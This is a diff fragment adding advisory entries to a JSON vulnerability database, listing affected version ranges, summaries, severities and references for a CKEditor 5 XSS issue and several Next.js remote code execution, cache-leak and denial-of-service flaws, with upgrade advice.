+            "atOrAbove": "48.0.0",
+            "below": "48.5.1"
+          }
+        ],
+        "summary": "CKEditor: Cross-site scripting (XSS) in the engine package",
+        "details": "### Impact\nA Cross-Site Scripting (XSS) vulnerability has been discovered in the CKEditor 5 engine. This vulnerability could be triggered by inserting specially crafted markup under a specific General HTML Support configuration that allows inserting objects, leading to unauthorized JavaScript code execution in a browser context isolated from the origin of the application embedding the editor.\n\nThis vulnerability affects only installations where General HTML Support is enabled and configured to allow the affected HTML content.\n\n### Patches\nThe problem has been recognized and patched. The fix will be available in version `48.5.1` (and above) and `47.7.4` (LTS).\n\n### For more information\nEmail us at [security@cksource.com](mailto:security@cksource.com) if you have any questions or comments about this advisory.",
+        "identifiers": {
+          "githubID": "GHSA-v6mg-96c6-gmpq",
+          "CVE": [
+            "CVE-2026-116687"
+          ]
+        },
+        "severity": "low",
+        "cwe": [
+          "CWE-79"
+        ],
+        "info": [
+          "https://github.com/ckeditor/ckeditor5/security/advisories/GHSA-v6mg-96c6-gmpq",
+          "https://github.com/ckeditor/ckeditor5/commit/4d9c5bb34f63cd956d15ccafbe584e14280c86a0",
+          "https://github.com/ckeditor/ckeditor5/commit/a750e38635db6a18c5b11599c09f4fd702850423",
+          "https://github.com/ckeditor/ckeditor5/releases/tag/v47.7.4",
+          "https://github.com/ckeditor/ckeditor5/releases/tag/v48.5.1"
         ]
       }
     ],
@@ -12124,6 +12296,110 @@
           "https://github.com/vercel/next.js/commit/719e4c67d6e92df60246f95e1d96e2dd60789a52",
           "https://github.com/vercel/next.js/releases/tag/v15.5.27",
           "https://github.com/vercel/next.js/releases/tag/v16.3.8"
+        ]
+      },
+      {
+        "ranges": [
+          {
+            "atOrAbove": "10.0.0",
+            "below": "15.5.28"
+          },
+          {
+            "atOrAbove": "16.0.0",
+            "below": "16.4.1"
+          }
+        ],
+        "summary": "Next.js: Unauthenticated Remote Code Execution in Image Optimization API when SVG files are used",
+        "details": "## Impact\n\nA memory-related vulnerability has been discovered in an upstream library used for Image Optimization can lead to possible remote code execution (RCE) when Next.js runs on glibc-based Linux.\n\n## Workaround\n\nEnsure the version of `sharp` used by Next.js is greater than or equal to `0.35.5`. Fresh installs automatically get a fixed version of `sharp`.\nUpgrading Next.js to the patched versions will ensure package managers automatically provide a fixed version of `sharp` to Next.js.",
+        "identifiers": {
+          "githubID": "GHSA-2464-fhr4-w9xw"
+        },
+        "severity": "critical",
+        "cwe": [
+          "CWE-1395"
+        ],
+        "info": [
+          "https://github.com/vercel/next.js/security/advisories/GHSA-2464-fhr4-w9xw",
+          "https://github.com/vercel/next.js/commit/5e3b687b5edb868b064bdc058d768a7021e7f6ad",
+          "https://github.com/vercel/next.js/commit/9571ec899f063df6533351bec390ccb2cc0af6a3",
+          "https://github.com/vercel/next.js/releases/tag/v15.5.28",
+          "https://github.com/vercel/next.js/releases/tag/v16.4.1"
+        ]
+      },
+      {
+        "ranges": [
+          {
+            "atOrAbove": "16.0.0",
+            "below": "16.4.1"
+          }
+        ],
+        "summary": "Next.js: Unauthenticated Remote Code Execution in `use cache` functions returning typed arrays",
+        "details": "## Impact\n\nA vulnerability in applications using App router with Cache Component can lead to remote code execution. The application needs to have a `use cache` function that returns multiple typed arrays.\n\n## Workaround\n\nThere is no known workaround for affected applications with such `use cache` functions. You should upgrade immediately even if your application does not have similar functions.",
+        "identifiers": {
+          "githubID": "GHSA-673q-mjm6-r5xr"
+        },
+        "severity": "critical",
+        "cwe": [
+          "CWE-502"
+        ],
+        "info": [
+          "https://github.com/vercel/next.js/security/advisories/GHSA-673q-mjm6-r5xr",
+          "https://github.com/vercel/next.js/commit/a4cea6aec5da89d116b8960e113189cf51745d2f",
+          "https://github.com/vercel/next.js/releases/tag/v16.4.1"
+        ]
+      },
+      {
+        "ranges": [
+          {
+            "atOrAbove": "16.3.0",
+            "below": "16.3.8"
+          }
+        ],
+        "summary": "next.js cache leak across root param values in nested 'use cache' functions",
+        "details": "### Impact\n\nWith Cache Components enabled (`cacheComponents: true`), a `'use cache'` function that calls another `'use cache'` function that reads a root param can be keyed incorrectly when the inner call is served from an existing entry: the enclosing function's cache key then omits that root param. The enclosing entry is written once and reused for all root param values, so a response for one root param value can serve content produced for a different value — whether the page is prerendered at build time or at runtime, or rendered dynamically. Shared cache headers let downstream caches redistribute the content further. \n\nWhat values are leaked cannot be attacker controlled. Which value's content is served depends only on which invocation wrote the entry first.\n\n### Workarounds\n\nThere are no known workarounds. Apps should upgrade to the patched version as soon as possible.",
+        "identifiers": {
+          "githubID": "GHSA-h694-7cp9-m8p3",
+          "CVE": [
+            "CVE-2026-103004"
+          ]
+        },
+        "severity": "medium",
+        "cwe": [
+          "CWE-524"
+        ],
+        "info": [
+          "https://github.com/vercel/next.js/security/advisories/GHSA-h694-7cp9-m8p3",
+          "https://github.com/vercel/next.js/commit/e92db4536a7f34ae2dbda583cfa1b4e0d06d1865",
+          "https://github.com/vercel/next.js/releases/tag/v16.3.8"
+        ]
+      },
+      {
+        "ranges": [
+          {
+            "atOrAbove": "13.0.0",
+            "below": "15.5.28"
+          },
+          {
+            "atOrAbove": "16.0.0",
+            "below": "16.4.1"
+          }
+        ],
+        "summary": "Next.js: Denial of Service in App Router using Server Actions",
+        "details": "## Impact\n\nCrafted requests targeting Next.js applications using App Router with at least one Server Action can lead to excessive CPU usage blocking processing of further requests in the same process.\n\n## Workarounds\n\nNo workaround exists besides upgrading. Applications using Pages Router or not using Server Actions are not vulnerable.",
+        "identifiers": {
+          "githubID": "GHSA-p3m5-59mp-jv5r",
+          "CVE": [
+            "CVE-2026-94482"
+          ]
+        },
+        "severity": "high",
+        "cwe": [
+          "CWE-770"
+        ],
+        "info": [
+          "https://github.com/vercel/next.js/security/advisories/GHSA-p3m5-59mp-jv5r",
+          "https://github.com/vercel/next.js/releases/tag/v15.5.28",
+          "https://github.com/vercel/next.js/releases/tag/v16.4.1"
         ]
       }
     ],
